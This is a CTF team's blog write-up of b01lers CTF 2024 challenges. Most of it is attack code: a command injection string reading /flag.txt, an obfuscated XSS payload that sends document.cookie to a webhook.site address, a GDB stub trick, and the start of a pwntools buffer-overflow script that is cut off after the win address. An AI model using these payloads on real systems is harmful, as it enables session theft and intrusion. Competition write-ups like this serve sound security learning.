<!DOCTYPE html><html lang="ja"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="/blog/favicon.ico"><meta name="theme-color" content="#22222a"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css" integrity="sha384-wcIxkf4k558AjM3Yz3BBFQUbk/zgIYC2R0QpeeYb+TwlBVMrlgLqwRjRtGZiK7ww" crossorigin="anonymous"><title>
      b01lers CTF 2024 Writeup | Wani Hackase Blog
    </title> <title>b01lers CTF 2024 Writeup | Wani Hackase Blog</title><link rel="canonical" href="http://localhost:4321/blog/posts/b01lers-ctf-2024/"><meta name="robots" content="index, follow"><meta property="og:title" content="b01lers CTF 2024 Writeup | Wani Hackase Blog"><meta property="og:type" content="article"><meta property="og:image" content="https://wanictf.org/blog/og/b01lers-ctf-2024.png"><meta property="og:url" content="http://localhost:4321/blog/posts/b01lers-ctf-2024/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:creator" content="@wanictf"> <link rel="stylesheet" href="/blog/_astro/index.CSdFvPke.css"></head> <body> <div class="max-w-[832px] px-4 mx-auto"> <div class="mb-2"><div class="flex items-center py-2"> <div class="text-2xl"> <a href="/blog">Wani Hackase Blog</a> </div> <div class="flex-grow"></div> <div class="flex gap-4"> <div><a href="/blog">Home</a></div> <div><a href="https://wanictf.org/about/">About</a></div> </div> </div></div> <div class="mb-4"><hr></div>   <div class="markdown-content"> <h1 id="b01lers-ctf-2024-writeup">b01lers CTF 2024 Writeup</h1>
<h2 id="miscwabash">misc/wabash</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-keyword)"> ||</span><span style="color:var(--astro-code-token-function)">cat$</span><span style="color:var(--astro-code-color-text)">{IFS}</span><span style="color:var(--astro-code-token-function)">/flag.txt</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">sh:</span><span style="color:var(--astro-code-token-string)"> 1:</span><span style="color:var(--astro-code-token-string)"> wa:</span><span style="color:var(--astro-code-token-string)"> not</span><span style="color:var(--astro-code-token-string)"> found</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{wabash:_command_not_found521065b339eb59a71c06a0dec824cd55}</span></span>
<span class="line"></span></code></pre>
<h2 id="miscbash-cat-with-pipe">misc/bash cat with pipe</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> cat</span><span style="color:var(--astro-code-token-string)"> with</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> ls</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> xargs</span><span style="color:var(--astro-code-token-string)"> cat</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{owwwww_th4t_hurt}</span><span style="color:var(--astro-code-token-function)">#!/usr/local/bin/python3</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">...</span></span>
<span class="line"></span></code></pre>
<h2 id="webb01ler-ad">web/b01ler-ad</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-color-text)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-token-function)">.replace</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">String</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">104</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">112</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">115</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">58</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">119</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">104</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">111</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">111</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">107</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">46</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">115</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">105</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">97</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">54</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">49</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">52</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">51</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">49</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">100</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">63</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">Bdocument</span><span style="color:var(--astro-code-color-text)">.cookie)&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span></span>
<span class="line"></span></code></pre>
<h2 id="revannnnnnny-second-now">rev/Annnnnnny Second Now</h2>
<p>Since <code>super_optimized_function</code> is just the Fibonacci series, we can calculate the value in advance.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-color-text)"> cache</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)">[]</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">=></span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">&#x3C;=</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-keyword)">n?</span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">:</span><span style="color:var(--astro-code-color-text)">cache[x]</span><span style="color:var(--astro-code-token-keyword)">?</span><span style="color:var(--astro-code-color-text)">cache[x]</span><span style="color:var(--astro-code-token-keyword)">:</span><span style="color:var(--astro-code-color-text)">(cache[x]</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(x</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-keyword)">n</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(x</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-keyword)">n</span><span style="color:var(--astro-code-color-text)">));</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-function)">BigInt</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">0x5a</span><span style="color:var(--astro-code-color-text)">))</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">2880067194370816120</span><span style="color:var(--astro-code-token-keyword)">n</span></span>
<span class="line"></span></code></pre>
<p>Then we just use <a href="https://github.com/hugsy/gef">GEF</a> with GDB.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">gef➤</span><span style="color:var(--astro-code-token-string)">  stub</span><span style="color:var(--astro-code-token-string)"> --retval</span><span style="color:var(--astro-code-token-constant)"> 2880067194370816120</span><span style="color:var(--astro-code-token-string)"> super_optimized_calculation</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Breakpoint</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-string)"> at</span><span style="color:var(--astro-code-token-constant)"> 0x555555555171</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[+] All calls to </span><span style="color:var(--astro-code-token-string-expression)">'super_optimized_calculation'</span><span style="color:var(--astro-code-color-text)"> will be skipped (</span><span style="color:var(--astro-code-token-function)">with</span><span style="color:var(--astro-code-token-string)"> return</span><span style="color:var(--astro-code-token-string)"> value</span><span style="color:var(--astro-code-token-string)"> set</span><span style="color:var(--astro-code-token-string)"> to</span><span style="color:var(--astro-code-token-constant)"> 0x27f80ddaa1ba7878</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">gef➤</span><span style="color:var(--astro-code-token-string)">  run</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Starting</span><span style="color:var(--astro-code-token-string)"> program:</span><span style="color:var(--astro-code-token-string)"> /home/southball/ctf/B01lersCTF2024/Annnnnnny</span><span style="color:var(--astro-code-token-string)"> Second</span><span style="color:var(--astro-code-token-string)"> Now/Annnnnnny-Second-Now</span><span style="color:var(--astro-code-color-text)"> </span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[Thread debugging using libthread_db enabled]</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Using</span><span style="color:var(--astro-code-token-string)"> host</span><span style="color:var(--astro-code-token-string)"> libthread_db</span><span style="color:var(--astro-code-token-string)"> library</span><span style="color:var(--astro-code-token-string-expression)"> "/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span style="color:var(--astro-code-token-string)">.</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[+] Ignoring call to </span><span style="color:var(--astro-code-token-string-expression)">'super_optimized_calculation'</span><span style="color:var(--astro-code-color-text)"> (</span><span style="color:var(--astro-code-token-function)">setting</span><span style="color:var(--astro-code-token-string)"> return</span><span style="color:var(--astro-code-token-string)"> value</span><span style="color:var(--astro-code-token-string)"> to</span><span style="color:var(--astro-code-token-constant)"> 0x27f80ddaa1ba7878</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{what</span><span style="color:var(--astro-code-token-function)">'s_memoization?}</span></span>
<span class="line"></span></code></pre>
<h2 id="pwnshall-we-play-a-game">pwn/shall-we-play-a-game</h2>
<p>BoF</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">4004</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">win </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">004011DD</span></span>
<span class="line"></span>
